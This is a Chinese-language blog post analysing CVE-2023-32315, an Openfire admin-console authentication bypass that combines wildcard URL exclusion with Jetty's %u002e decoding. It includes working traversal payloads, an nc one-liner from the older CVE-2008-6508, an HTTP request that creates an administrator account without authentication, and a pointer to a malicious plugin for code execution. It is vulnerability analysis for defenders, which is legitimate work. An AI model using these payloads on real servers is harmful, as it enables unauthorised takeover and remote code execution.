---
created: 2024-09-30T02:46:00+00:00
categories:
  - 技术研究
tags:
  - CVE
updated: 2023-06-18T00:00:00+00:00
date: 2023-06-14T00:00:00+00:00
slug: cve-2023-32315-openfire-auth-bypass
title: CVE-2023-32315 Openfire管理控制台认证绕过漏洞分析
cover: https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/96f1706d-c58d-461b-be59-1d3e0f503248/openfire.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050157Z&X-Amz-Expires=3600&X-Amz-Signature=eefd899aab60994dcdf675b6a759718942897fc9ca2746b8d0376bfb9410e1e2&X-Amz-SignedHeaders=host&x-id=GetObject
id: 111906e1-7468-8075-83c0-ddd4d73428e5
---

## 漏洞简介

Openfire 是一个实时协作（RTC）服务器，编写于 Java，它使用唯一被广泛采用的即时通讯开放协议 XMPP，并提供 Web 管理界面。

Openfire 的 API 定义了一种机制，允许使用通配符实现灵活的 URL 模式匹配以将某些 URL 从 Web 认证中排除。并且由于 Openfire 使用到的 Web 服务器支持解析非标准的 UTF-16 字符 URL 编码变体，导致了路径遍历漏洞。通配符模式匹配与路径遍历漏洞的组合可以使攻击者绕过认证访问后台管理控制台，最终通过后台上传恶意插件能够实现远程代码执行，完全地控制服务器权限。

## 影响版本

- > =3.10.0, <4.6.8
- > =4.7.0, <4.7.5

## 漏洞分析

### 通配符模式匹配致使的鉴权绕过

Openfire 的 API 定义了一种机制，可以将某些 URL 从 Web 认证中排除，此机制允许使用通配符，以实现灵活的 URL 模式匹配。在存在漏洞的 4.7.4 版本中，`xmppserver/src/main/webapp/WEB-INF/web.xml`配置文件的相关内容如下。

```xml
<filter>
  <filter-name>AuthCheck</filter-name>
  <filter-class>org.jivesoftware.admin.AuthCheckFilter</filter-class>
  <init-param>
    <param-name>excludes</param-name>
    <param-value>
      login.jsp,index.jsp?logout=true,setup/index.jsp,setup/setup-*,.gif,.png,error-serverdown.jsp,loginToken.jsp
    </param-value>
  </init-param>
</filter>
```

这里的本意是，符合如上列表中的文件，如登录页面、首次安装页面、静态图片/CSS 文件等，请求它们，便排除在 Web 认证之外。

通过版本对比，可以发现在安全的 4.7.5 版本中，`setup/index.jsp`和`setup/setup-*`已经被删除了。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/b82cc41a-f0e5-45c6-aa66-a54f8950d58e/web-xml.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=bfe8b4dbfdb54b1c3924d944aaf9fad588392b19daf4ed8f39424a7ad5505b39&X-Amz-SignedHeaders=host&x-id=GetObject)

Openfire 的鉴权位于`org.jivesoftware.admin.AuthCheckFilter`类中的`doFilter`鉴权方法。

```java
public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException {
    HttpServletRequest request = (HttpServletRequest) req;
    HttpServletResponse response = (HttpServletResponse) res;
    // Do not allow framing; OF-997
    response.setHeader("X-Frame-Options", JiveGlobals.getProperty("adminConsole.frame-options", "SAMEORIGIN"));
    // Reset the defaultLoginPage variable
    String loginPage = defaultLoginPage;
    if (loginPage == null) {
        loginPage = request.getContextPath() + (AuthFactory.isOneTimeAccessTokenEnabled() ? "/loginToken.jsp" : "/login.jsp");
    }
    // Get the page we're on:
    String url = request.getRequestURI().substring(1);
    if (url.startsWith("plugins/")) {
        url = url.substring("plugins/".length());
    }
    // See if it's contained in the exclude list. If so, skip filter execution
    boolean doExclude = false;
    for (String exclude: excludes) {
        if (testURLPassesExclude(url, exclude)) {
            doExclude = true;
            break;
        }
    }
    if (!doExclude) {
        WebManager manager = new WebManager();
        manager.init(request, response, request.getSession(), context);
        boolean haveOneTimeToken = manager.getAuthToken() instanceof AuthToken.OneTimeAuthToken;
        User loggedUser = manager.getUser();
        boolean loggedAdmin = loggedUser == null ? false : adminManager.isUserAdmin(loggedUser.getUsername(), true);
        if (!haveOneTimeToken && !loggedAdmin && !authUserFromRequest(request)) {
            response.sendRedirect(getRedirectURL(request, loginPage, null));
            return;
        }
    }
    chain.doFilter(req, res);
}
```

在其中，可以看到如下片段代码，对`excludes`列表进行循环，执行`testURLPassesExclude(url, exclude)`方法的判断，若`testURLPassesExclude`返回 true，那么`doExclude`的值也将为 true，循环将会 break，最终就能够成功实现鉴权绕过；否则当`doExclude`为 false 时，便会跳转登录页面。

```java
// See if it's contained in the exclude list. If so, skip filter execution
boolean doExclude = false;
for (String exclude: excludes) {
  if (testURLPassesExclude(url, exclude)) {
    doExclude = true;
    break;
  }
}
if (!doExclude) {
  WebManager manager = new WebManager();
  manager.init(request, response, request.getSession(), context);
  boolean haveOneTimeToken = manager.getAuthToken() instanceof AuthToken.OneTimeAuthToken;
  User loggedUser = manager.getUser();
  boolean loggedAdmin = loggedUser == null ? false : adminManager.isUserAdmin(loggedUser.getUsername(), true);
  if (!haveOneTimeToken && !loggedAdmin && !authUserFromRequest(request)) {
    response.sendRedirect(getRedirectURL(request, loginPage, null));
    return;
  }
}
chain.doFilter(req, res);
```

这能够表明，`testURLPassesExclude`方法就是实现鉴权绕过的关键。

在对该方法做进一步分析前，先回顾一个十五年的漏洞。其实最早在 2008 年，v3.6.0 版本的 Openfire 就已经出现过一次路径遍历漏洞，漏洞编号是 CVE-2008-6508，该漏洞的 POC 如下。

```text
GET /setup/setup-/../../log.jsp HTTP/1.1
```

官方在 v3.6.1 版本只考虑了对原始的`..`进行了判断和过滤，这样修复的并不彻底，如下经过 URL 编码的`..`的 payload 仍然能够进行绕过。

```shell
echo "GET /setup/setup-/%2E%2E/%2E%2E/log.jsp?log=info&mode=asc&lines=All" | nc localhost 9090
```

于是官方在 v3.6.2 版本中又对`%2e`的情况进行了判断和过滤。

```java
// v3.6.2
// src/java/org/jivesoftware/admin/AuthCheckFilter.java

public static boolean testURLPassesExclude(String url, String exclude) {
    // ...
    if (exclude.endsWith("*")) {
        if (url.startsWith(exclude.substring(0, exclude.length() - 1))) {
            // Now make sure that there are no ".." characters in the rest of the URL.
            if (!url.contains("..") && !url.toLowerCase().contains("%2e")) {
                return true;
            }
        }
    }
    // ...
    return false;
}
```

这一段代码延续至今，在十几年后的 4.7.4 版本中依然没发生变化，4.7.4 版本的`testURLPassesExclude`方法内容如下，已省略部分无关代码。

```java
public static boolean testURLPassesExclude(String url, String exclude) {
    // ...
    // in the URL and then the resulting url must exactly match the exclude rule. If the exclude ends with a "*"
    // character then the URL is allowed if it exactly matches everything before the * and there are no ".."
    // characters after the "*". All data in the URL before

    if (exclude.endsWith("*")) {
        if (url.startsWith(exclude.substring(0, exclude.length() - 1))) {
            // Now make sure that there are no ".." characters in the rest of the URL.
            if (!url.contains("..") && !url.toLowerCase().contains("%2e")) {
                return true;
            }
        }
    }
    // ...
    return false;
}
```

通过漏洞 Reporter 在 CVE-2023-32315 的 GitHub Security Advisory 中提供的 POC `/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp`，可以发现这个路径恰恰是符合`excludes`列表中的`setup/setup-*`的通配符匹配。当二者共同传入进`testURLPassesExclude`方法中时，便能符合如上的几个判断，顺利返回 true 到`doExclude`中，使`doExclude`的值也为 true，最终便成功的绕过`doExclude`的鉴权，顺利到达 Openfire 的 Jetty Web 服务器，由其继续处理。

### Jetty“新特性”致使的路径遍历

在早期版本的 Openfire 中，当时内置的 Jetty Web 服务器不支持解析`%u002e`这种编码，所以当时的安全补丁简单的过滤`..`和`%2e`，对于早期版本的 Openfire 是足够了的。

但是在之后版本的 Openfire 中，使用的 Jetty Web 服务器能够支持这种非标准的 UTF-16 字符 URL 编码变体，这种“新特性”导致原本的路径遍历漏洞又一次地出现在 Openfire 中，此处的“新”是相对而言。

Openfire v4.7.4 中的 Jetty 版本为 9.4.43.v20210629，请求路径的处理位于`org.eclipse.jetty.http.HttpURI`类，跟进其中的`parse`方法，来到它的末尾关键代码片段。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/cd780c6c-182a-416f-9c11-44d1c297e415/httpuri-parse.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=b416c81585fdde16014024b603d74891d8d5cd74a02ef7fd8d591e4d6b34c5b1&X-Amz-SignedHeaders=host&x-id=GetObject)

```java
else if (_path != null)
{
  // The RFC requires this to be canonical before decoding, but this can leave dot segments and dot dot segments
  // which are not canonicalized and could be used in an attempt to bypass security checks.
  String decodedNonCanonical = URIUtil.decodePath(_path);
  _decodedPath = URIUtil.canonicalPath(decodedNonCanonical);
  if (_decodedPath == null)
    throw new IllegalArgumentException("Bad URI");
}
```

这段代码会调用`URIUtil.decodePath`方法进行解码，然后使用`URIUtil.canonicalPath`对解码后的路径做规范化处理。

解码路径的方法位于`org.eclipse.jetty.util.URIUtil#decodePath`，完整内容如下。

```java
public static String decodePath(String path, int offset, int length) {
    try {
        Utf8StringBuilder builder = null;
        int end = offset + length;
        for (int i = offset; i < end; i++) {
            char c = path.charAt(i);
            switch (c) {
                case '%':
                    if (builder == null) {
                        builder = new Utf8StringBuilder(path.length());
                        builder.append(path, offset, i - offset);
                    }
                    if ((i + 2) < end) {
                        char u = path.charAt(i + 1);
                        if (u == 'u') {
                            // In Jetty-10 UTF16 encoding is only supported with UriCompliance.Violation.UTF16_ENCODINGS.
                            // This is wrong. This is a codepoint not a char
                            builder.append((char)(0xffff & TypeUtil.parseInt(path, i + 2, 4, 16)));
                            i += 5;
                        } else {
                            builder.append((byte)(0xff & (TypeUtil.convertHexDigit(u) * 16 + TypeUtil.convertHexDigit(path.charAt(i + 2)))));
                            i += 2;
                        }
                    } else {
                        throw new IllegalArgumentException("Bad URI % encoding");
                    }

                    break;

								// ...

                default:
                    if (builder != null)
                        builder.append(c);
                    break;
            }
        }

        if (builder != null)
            return builder.toString();
        if (offset == 0 && length == path.length())
            return path;
        return path.substring(offset, end);
    } catch (NotUtf8Exception e) {
        LOG.debug(path.substring(offset, offset + length) + " " + e);
        return decodeISO88591Path(path, offset, length);
    } catch (IllegalArgumentException e) {
        throw e;
    } catch (Exception e) {
        throw new IllegalArgumentException("cannot decode URI", e);
    }
}
```

根据如上代码的逻辑，当传入`%u002e`字符串到`decodePath`方法时，它会对该字符串进行解码处理。

1. 首先，方法进入循环，遍历字符串中的字符。
2. 在循环中，遇到字符`%`，表示接下来的字符是需要解码的。
3. 方法检查接下来的字符是否为`u`。因为`%u002e`中的`u`是小写的，所以会执行以下代码块：

   ```java
   if (u == 'u') {
       builder.append((char)(0xffff & parseInt(path, i + 2, 4, 16)));
       i += 5;
   }
   ```

   - 方法调用`TypeUtil.parseInt`方法解析四个字符`002e`，并将解析结果作为一个字符添加到`builder`中。这里的`TypeUtil.parseInt`方法会将十六进制字符解析为对应的数值。

     ```java
       public static int parseInt(String s, int offset, int length, int base) throws NumberFormatException {
         int value = 0;

         if (length < 0)
           length = s.length() - offset;

         for (int i = 0; i < length; i++) {
           char c = s.charAt(offset + i);

           int digit = convertHexDigit((int) c);
           if (digit < 0 || digit >= base)
             throw new NumberFormatException(s.substring(offset, offset + length));
           value = value * base + digit;
         }
         return value;
       }
     ```

   - 解析结果为`.`的 Unicode 码点（0x002e）。
   - `(char)(0xffff & TypeUtil.parseInt(path, i + 2, 4, 16))`将 Unicode 码点强制转换为一个字符，并将其添加到`builder`中。
   - `i += 5`用于跳过解码的字符，即`%u002e`中的`u002e`。

4. 循环继续，因为已经处理完`%u002e`，下一个字符是正常字符`.`。
5. 方法将`.`直接添加到`builder`中。
6. 循环结束，根据`builder`的内容生成一个新的字符串，并将其返回。

当然，也可以运行看看实际的结果，创建一个新项目，并导入如下版本的 maven 依赖。

```xml
<dependencies><!-- https://mvnrepository.com/artifact/org.eclipse.jetty/jetty-util -->
    <dependency>
        <groupId>org.eclipse.jetty</groupId>
        <artifactId>jetty-util</artifactId>
        <version>9.4.43.v20210629</version>
    </dependency>
</dependencies>
```

然后编写如下代码。

```java
package org.jetty;

import org.eclipse.jetty.util.URIUtil;

class Main {
    public static void main(String[] args) {
        String path = "/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp";

        String decodedNonCanonical = URIUtil.decodePath(path);
        System.out.println("decodedNonCanonical: " + decodedNonCanonical);
        String decodedPath = URIUtil.canonicalPath(decodedNonCanonical);
        if (decodedPath == null)
            throw new IllegalArgumentException("Bad URI");
        System.out.println("decodedPath: " + decodedPath);
    }
}
```

首先`URIUtil.decodePath`将`/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp`解码为`/setup/setup-s/../../log.jsp`，接着`URIUtil.canonicalPath`方法将该路径规范化处理成`/log.jsp`。

```text
2023-06-15 16:33:47.987:INFO::main: Logging initialized @272ms to org.eclipse.jetty.util.log.StdErrLog
decodedNonCanonical: /setup/setup-s/../../log.jsp
decodedPath: /log.jsp
```

在维基百科的说法中，`%uxxxx`这种形式的编码是一种非标准的 Unicode 字符编码方式，其中 xxxx 表示一个 UTF-16 代码单元，由四个十六进制数字表示。这种行为没有被任何 RFC 规范指定，并且被 W3C 拒绝。

## 漏洞利用

### 路径遍历

在一个未登录 Openfire 的浏览器中，通过如下请求路径，如果显示部分日志文件则表明存在漏洞，如果重定向到登录页面，则表明无漏洞。

```text
http://localhost:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

### 未授权用户创建

创建一个账号和密码为 admin2/admin2 的管理员用户。

```text
GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=Jm6f0wY78QMP8jj&username=admin2&name=admin2&email=admin2%40example.com&password=admin2&passwordConfirm=admin2&isadmin=on&create=Create+User HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
Connection: close
Cache-Control: max-age=0


```

```text
HTTP/1.1 200 OK
Connection: close
Date: Wed, 14 Jun 2023 06:47:48 GMT
X-Frame-Options: SAMEORIGIN
Content-Type: text/html;charset=utf-8
Set-Cookie: csrf=NX7COAs1lgRsMdd; Path=/; HttpOnly
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Content-Length: 6187


    Exception:
……
```

### 插件上传实现 RCE

登录如上创建的管理员用户，在后台添加恶意插件然后实现远程代码执行。恶意插件的实现可以是自己基于 Openfire 已有的插件进行二开，也可以使用如下恶意插件。

- [https://github.com/vulhub/openfire-fastpath-plugin](https://github.com/vulhub/openfire-fastpath-plugin)

## 修复建议

目前厂商已升级了安全版本以修复这个安全问题，请到厂商的发布主页下载安全版本：

[https://github.com/igniterealtime/Openfire/releases](https://github.com/igniterealtime/Openfire/releases)

## 参考

- [https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm](https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm)
- [https://igniterealtime.atlassian.net/browse/OF-2595](https://igniterealtime.atlassian.net/browse/OF-2595)
- [https://igniterealtime.atlassian.net/browse/JM-1489](https://igniterealtime.atlassian.net/browse/JM-1489)
- [https://en.wikipedia.org/wiki/URL_encoding#Non-standard_implementations](https://en.wikipedia.org/wiki/URL_encoding#Non-standard_implementations)
- [https://github.com/vulhub/openfire-fastpath-plugin](https://github.com/vulhub/openfire-fastpath-plugin)
